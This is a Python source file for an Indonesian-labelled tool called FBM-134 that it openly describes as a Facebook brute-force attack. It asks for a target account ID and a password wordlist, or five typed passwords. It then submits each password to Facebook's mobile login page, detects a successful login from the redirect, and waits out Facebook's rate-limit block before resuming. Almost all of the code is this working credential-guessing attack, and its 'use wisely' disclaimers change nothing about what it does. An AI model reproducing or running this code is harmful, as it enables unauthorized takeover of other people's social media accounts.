import requests
import os
import socket
import time
import argparse
import itertools
import threading
import sys
import functools
import configparser
import urllib.error
import urllib.parse
import urllib.request
import csv
import gzip
from random import choice
from datetime import datetime
now = datetime.now()

#[variabel] Team
_Team___ = "Cyber-Security-Dev"
_version = "v1.0.2020-dev-"

_______option = {}

# class Kumpulan const


class const():
    ResetAll = "\033[0m"
    Dim = "\033[2m"
    Bold = "\033[1m"
    Underlined = "\033[4m"
    Blink = "\033[5m"
    Reverse = "\033[7m"
    Hidden = "\033[8m"

    ResetBold = "\033[21m"
    ResetDim = "\033[22m"
    ResetUnderlined = "\033[24m"
    ResetBlink = "\033[25m"
    ResetReverse = "\033[27m"
    ResetHidden = "\033[28m"


def _____________banner():
    numList = ["Banner/Linux/banner01.txt", "Banner/Linux/banner02.txt", "Banner/Linux/banner03.txt",
               "Banner/Linux/banner04.txt", "Banner/Linux/banner05.txt", "Banner/Linux/banner06.txt", "Banner/Linux/banner07.txt"]
    for x in range(1):
        file__________banner = choice(numList)
        if file__________banner == "Banner/Linux/banner01.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " Version : v1.0.2020-dev- ")
            print(colors.White + " Code : 46 42 4D 2D 31 33 34")
            print(colors.White + " ROC:LOC")
            print(const.ResetDim + colors.LightBlue +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner02.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " FBM-134 : Use This Tool Wisely And Be A Good User ")
            print(const.ResetDim + colors.LightRed +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner03.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White +
                  " FBM-134 : Damage that occurs is not our responsibility ")
            print(const.ResetDim + colors.LightBlue +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner04.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + "  FBM-134 Park, Facebook Brute Force Attack")
            print(colors.White + "  Version v1.0.2020-dev- , -")
            print(colors.White + "  Ready...")
            print(const.ResetDim + colors.LightMagenta +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner05.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " Version : v1.0.2020-dev- ")
            print(colors.White + " Code : 46 42 4D 2D 31 33 34")
            print(colors.White + " ROC:LOC")
            print(const.ResetDim + colors.LightRed +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner06.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White + " FBM-134 : Use This Tool Wisely And Be A Good User ")
            print(const.ResetDim + colors.LightGray +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass
        elif file__________banner == "Banner/Linux/banner07.txt":
            fileBanner_ = open(file__________banner)
            print(' ')
            print(colors.White +
                  " FBM-134 : Damage that occurs is not our responsibility ")
            print(const.ResetDim + colors.LightBlue +
                  fileBanner_.read() + colors.Green)
            print(colors.LightGreen + "       =[" + colors.Magenta + " FBM v1.0.2020-dev-" +
                  colors.LightGreen + "                                ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " FBM-134 : Use This Tool Wisely And Be A Good User" + colors.LightGreen + " ]")
            print(colors.LightGreen + "+ -- --=[" + colors.LightGreen +
                  " Version : v1.0.2020-dev-" + colors.LightGreen + "                          ]")
            print(' ')
            fileBanner_.close()
            pass


#[Generate]


# Class Kumpulan Warna
class colors():
    Default = "\033[39m"
    Black = "\033[30m"
    Red = "\033[31m"
    Green = "\033[32m"
    Yellow = "\033[33m"
    Blue = "\033[34m"
    Magenta = "\033[35m"
    Cyan = "\033[36m"
    LightGray = "\033[37m"
    DarkGray = "\033[90m"
    LightRed = "\033[91m"
    LightGreen = "\033[92m"
    LightYellow = "\033[93m"
    LightBlue = "\033[94m"
    LightMagenta = "\033[95m"
    LightCyan = "\033[96m"
    White = "\033[97m"

# function Password Basis Kamus

# print Hasil Ganerate Password Basis Kamus


# Class Loading COnsole FBM-134
def _Team__():
    _DE__ = False
    _NE__ = 1
    for x in itertools.cycle(['CY', 'BE', 'RS', 'EC', 'UR', 'IR', 'IT', 'Y']):
        _NE__ += 1
        sys.stdout.write('\r' + colors.LightRed + '[%s]' % (
            _NE__) + " Starting The FBM-134 Console(s)... " + x + colors.Default)
        sys.stdout.flush()
        time.sleep(0.1)
        if _NE__ == 100:
            os.system('clear')
            _interactive()
            break
        pass


'''
	FB-Brute Force 1.0 -x
	Jayalah Indonesiaku
	(c)2020 
	https://github.com/byindosecurity
	[IP] 114.125.56.148
'''

# Class Loading COnsole FBM-134


def ___Loading_():
    os.system("clear")
    _interactive()
    pass


def _cartridge():
    try:
        print(colors.LightRed + "[*] " +
              colors.LightGreen + "FBM-134 " + _version)
        name_result_saved = "Bin/password_attack.txt"
        save_result = []
        custom_worldlis = {}
        custom_worldlis["1"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "[1]Enter[PASS]:~$ ")
        custom_worldlis["2"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "[2]Enter[PASS]:~$ ")
        custom_worldlis["3"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "[3]Enter[PASS]:~$ ")
        custom_worldlis["4"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "[4]Enter[PASS]:~$ ")
        custom_worldlis["5"] = input(
            colors.LightRed + "[*] " + colors.LightGreen + "[5]Enter[PASS]:~$ ")
        kombinasi = [
            custom_worldlis["1"],
            custom_worldlis["2"],
            custom_worldlis["3"],
            custom_worldlis["4"],
            custom_worldlis["5"],
        ]
        for Y in kombinasi:
            save_result.append(Y)
        Generate_account_pass = open(name_result_saved, "w")
        Generate_account_pass.write(os.linesep.join(save_result))
        Generate_account_pass.close()
        no_worldlis_pass = open(name_result_saved, "r")
        _________no_worldlis = 0
        for x in no_worldlis_pass:
            _________no_worldlis += 1
        no_worldlis_pass.close()

        _no_worldlis_again = str(_________no_worldlis)
        ___attack(name_result_saved, _no_worldlis_again)
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen +
              "Shutting Down The FBM-134 Console" + colors.Default)


# interactive Console User Memilih Options
def _interactive():
    try:
        print(colors.LightRed +
              "[*] " + colors.LightGreen + "Starting persistent handler(s)")
        time.sleep(3)
        print(colors.LightRed + "[*] " +
              colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        __input = input(colors.LightRed + "[*] " + colors.LightGreen +
                        "Do you want to concatenate all words from wordlist? Y/[N]: ")

        if __input == 'y' or __input == 'Y':
            os.system('clear')
            _cartridge()
            pass
        elif __input == 'n' or __input == 'N':
            os.system('clear')
            _pintas()
        pass
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen +
              "Shutting Down The FBM-134 Console" + colors.Default)


def _returnpintas():
    try:
        filename_ = input(colors.LightRed +
                          "[*] " + colors.LightGreen + "Enter[Worldlist]:~$ ")
        if (filename_.find('txt') != -1):
            time.sleep(1)
            f = open(filename_, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(filename_, _no___)
        else:
            os.system('clear')
            print(colors.LightRed + "[*] " +
                  colors.LightGreen + "FBM-134 " + _version)
            strlip = (filename_ + ".txt")
            time.sleep(1)
            f = open(strlip, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(strlip, _no___)
    except FileNotFoundError:
        os.system("clear")
        print(colors.LightRed +
              "[-] The file You Entered Does Not Exist!" + colors.LightGreen)
        return _returnpintas()


def _pintas():
    try:
        print(colors.LightRed + "[*] " +
              colors.LightGreen + "FBM-134 " + _version)
        filename_ = input(colors.LightRed +
                          "[*] " + colors.LightGreen + "Enter[Worldlist]:~$ ")
        if (filename_.find('txt') != -1):
            time.sleep(1)
            f = open(filename_, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(filename_, _no___)
        else:
            os.system('clear')
            print(colors.LightRed + "[*] " +
                  colors.LightGreen + "FBM-134 " + _version)
            strlip = (filename_ + ".txt")
            time.sleep(1)
            f = open(strlip, "r")
            lines = 0
            for line in f:
                lines += 1
            f.close()
            _no___ = str(lines)
            ___attack(strlip, _no___)
    except FileNotFoundError:
        os.system("clear")
        print(colors.LightRed +
              "[-] The file You Entered Does Not Exist!" + colors.LightGreen)
        return _returnpintas()


#[Generate] Password Basis Kamus
def __Starting_():

    _str_ = False

    if _str_ == False:
        ___Loading_()

# option Attack Random Facebook


def ___attack(filename, _no___):
    try:
        os.system('clear')
        ___open = open(filename, 'r')
        _n = 0
        _x__________ = 0
        _____________banner()
        print(colors.LightRed + "[*] " + colors.LightGreen + "FBM-134 " + _version)
        time.sleep(1)
        u________ = input(colors.LightRed +
                          "[*] " + colors.LightGreen + "Target[ID]:~$ ")
        time.sleep(1)
        os.system('clear')
        _____________banner()
        ___________WEB________________ = "https://mbasic.facebook.com/login.php"
        print(colors.LightRed + "[*] " +
              colors.LightGreen + 'FBM-134 : ' + _version)
        print(colors.LightRed + "[*] " +
              colors.LightGreen + 'ACCOUNT : ' + u________ + '-')
        print(colors.LightRed + "[*] " + colors.LightGreen + colors.LightRed +
              'MEMULAI : ' + colors.LightGreen + "In Time %s" % time.strftime("%X"))
        for x in ___open:
            _n += 1
            _x__________ += 1
            lop_ = x.strip()
            ___________Dt_ = {'email': u________, 'pass': lop_, 'login': 'Masuk'}
            ___________fr_ = requests.post(
                ___________WEB________________, ___________Dt_)
            responsex = ___________fr_.url
            response = ___________fr_.text
            sys.stdout.write('\r' + colors.LightRed + "[*] " + colors.LightGreen + colors.LightGreen +
                             'ATTEMPT : [' + colors.LightRed + str(_n) + colors.LightGreen + ':' + _no___ + ']')
            sys.stdout.flush()
            time.sleep(1)

            if _x__________ == 65:
                _x__________ = 0

            if (response.find('Kami membatasi seberapa sering Anda dapat memposting') != -1):
                os.system("clear")
                _____________banner()
                print(colors.LightRed + "[*] " +
                      colors.LightGreen + 'FBM-134 : ' + _version)
                print(colors.LightRed +
                      "[*] " + colors.LightGreen + 'ACCOUNT : ' + u________ + '-')
                print(colors.LightRed + "[*] " + colors.LightGreen + colors.LightRed +
                      'SELESAI : ' + colors.LightGreen + "In 1 Hour 20 Minutes")
                print(colors.LightRed + "[*] " + colors.LightGreen + colors.LightGreen +
                      'ATTEMPT : [' + colors.LightRed + str(_n) + colors.LightGreen + ':' + _no___ + ']')
                print(colors.LightRed + "[*] " + colors.LightYellow +
                      "WARNING : " + colors.LightGreen + "BLOCK ATTACK!")
                time.sleep(4800)

            if responsex.find("home.php") != -1:
                os.system("clear")
                _____________banner()
                print(colors.LightRed + "[*] " +
                      colors.LightGreen + 'FBM-134 : ' + _version)
                print(colors.LightRed + "[*] " + colors.LightYellow + 'ACCOUNT : ' + colors.Blue + "[" +
                      colors.LightBlue + "FOUND" + colors.Blue + "] " + colors.LightGreen + u________ + '-')
                print(colors.LightRed + "[*] " + colors.LightYellow + "ATTEMPT :" + colors.Blue + " [" +
                      colors.LightBlue + "FOUND" + colors.Blue + "] " + colors.LightGreen + lop_ + colors.Green)
                break
    except KeyboardInterrupt:
        os.system("clear")
        print(colors.Red + "[*] " + colors.LightGreen  + "Shutting Down The FBM-134 Console" + colors.Default)



# start
if __name__ == "__main__":
    __Starting_()
